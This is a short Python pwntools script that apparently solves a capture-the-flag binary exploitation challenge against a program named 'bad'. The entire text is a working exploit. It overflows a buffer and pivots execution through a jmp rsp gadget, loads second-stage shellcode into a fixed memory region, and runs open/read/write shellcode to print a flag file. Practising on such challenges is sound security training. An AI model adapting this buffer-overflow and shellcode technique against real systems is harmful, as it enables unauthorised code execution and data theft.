from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = remote('node4.buuoj.cn', 26219)
io = process('bad')
context.binary = ELF('bad')

mmap = 0x123000
jmp_rsp = 0x400A01

io.recvuntil('have fun!')
pl1 = (asm(shellcraft.read(0, mmap, 0x100)) + asm("mov rax,0x123000;call rax")).ljust(0x28, b'\x00')
pl1 += p64(jmp_rsp) + asm("sub rsp,0x30;jmp rsp")
io.send(pl1)

pl2 = shellcraft.open('./flag')
pl2 += shellcraft.read(3, mmap + 0x100, 0x50)
pl2 += shellcraft.write(1, mmap + 0x100, 0x50)

io.send(asm(pl2))
io.interactive()

